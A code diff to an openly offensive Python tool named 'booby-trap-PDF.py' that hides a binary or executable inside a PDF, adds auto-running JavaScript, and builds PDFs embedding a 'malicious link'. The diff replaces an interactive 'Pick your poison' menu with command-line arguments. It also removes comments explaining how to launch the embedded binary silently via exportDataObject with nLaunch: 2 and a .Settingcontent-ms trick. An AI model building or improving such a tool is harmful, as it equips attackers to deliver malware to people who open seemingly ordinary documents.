@@ -1,0 +1,100 @@
+diff --git a/booby-trap-PDF.py b/booby-trap-PDF.py
+index 51d0b96..71a6bfc 100644
+--- a/booby-trap-PDF.py
++++ b/booby-trap-PDF.py
+@@ -1,3 +1,6 @@
++import argparse
++import sys
++import pathlib
+ import PyPDF4
+ import os
+ from fpdf import FPDF
+@@ -39,53 +42,58 @@ print("|>                 |_) (_) (_) |_) \/ | | (_| [_)  ~ |   |_/ |
+ print("|>                                 /          |                               <|")
+ print("|>============================================================================<|")
+ print("|>=============================================================EdgarMedina====<|")
+-print(                                   "Pick your poison: \n")
+-print(                 "[ 1 ] Incrust a binary, executable or file hidden in a PDF.\n")
+-print(                 "[ 2 ] Generate a PDF with a malicious link embed.\n\n")
+-print(                 "[ 3 ] Quit\n")
+-choice = input("            \nEnter choice =====> ")
+ 
+-if(choice == "1"):
+-    binary = input("Path to the binary file to embed ==========> ")
+-    pdfFile = input("Path to the PDF to be embed ===============> ")
++parser = argparse.ArgumentParser(
++    prog=f"booby-trap-PDF.py",
++    formatter_class=argparse.RawDescriptionHelpFormatter
++)
++parser.add_argument("mode",
++    type=str,
++    choices=["bin", "url"]
++)
++parser.add_argument("input",
++    type=str
++)
++parser.add_argument("output",
++    type=str
++)
++parser.add_argument("message",
++    type=str
++)
++
++args = parser.parse_args(sys.argv[1:])
++
++binary = pathlib.Path(args.message).resolve()
++pdfFile = pathlib.Path(args.input).resolve()
++out = pathlib.Path(args.output).resolve()
++
++if args.mode == "bin":
+     # opening the first pdf
+-    reader = PyPDF4.PdfFileReader(pdfFile)
++    reader = PyPDF4.PdfFileReader(str(pdfFile))
+     writer = PyPDF4.PdfFileWriter()
+-    print(f"original PDF size: {os.stat(pdfFile).st_size}")
++    print(f"original PDF size: {os.stat(str(pdfFile)).st_size}")
+ 
+     # copying the sample.pdf to a new writer
+     writer.appendPagesFromReader(reader)
+-    print(f"binary size: {os.stat(binary).st_size}")
++    print(f"binary size: {os.stat(str(binary)).st_size}")
+ 
+     # starts print job, testing for js execution
+     writer.addJS("this.print({bUI:true,bSilent:false,bShrinkToFit:true});")
+     # opening and embedding the binary into pdf
+     with open(binary, "rb") as rs:
+-        writer.addAttachment(binary, rs.read())
+-        #writer.addJS("this.exportDataObject({cName: 'binary', nLaunch: 2});")
+-    # adding JavaScript that will invoke the binary
+-    # nLaunch: 2 --> without prompting the user and saving it to a temp location
+-    # does not inside FoxitPdf reader since it block the execution
+-    #javascript = """this.exportDataObject({cName: 'binary' + '.Settingcontent-ms', nLaunch: 2});"""
+-    # writing to the new pdf that contains the attachment( binary )
++        writer.addAttachment(str(binary), rs.read())
+ 
+-    with open("boobytrapped.pdf", "wb") as f:
++    with open(out, "wb") as f:
+         writer.write(f)
+-    print(f"size of boobytrapped pdf: {os.stat('boobytrapped.pdf').st_size}")
+-    print("Binary added to boobytrapped.pdf")
+-
+-elif(choice == "2"):
+-    link = input("Enter the link to be embbeded --> ")
++    print(f"size of boobytrapped pdf: {os.stat(str(out)).st_size}")
++    print(f"Binary added to {out}")
++elif args.mode == "url":
+     pdf = FPDF()
+ 
+     pdf.add_page()
+     pdf.set_font("Courier", size = 15)
+     pdf.cell(200, 10, txt = "Booby-Trap",
+             ln = 1, align = 'C')
+-    pdf.cell(200, 10, txt = link, border = 1,
++    pdf.cell(200, 10, txt = args.message, border = 1,
+             ln = 2, align = 'C')
+-    pdf.output("BoobyLinked.pdf")   
+-elif(choice == "3"):
+-    exit
+-else:
+-        print(  " Invalid option. Please try again.")
++    pdf.output(str(out))
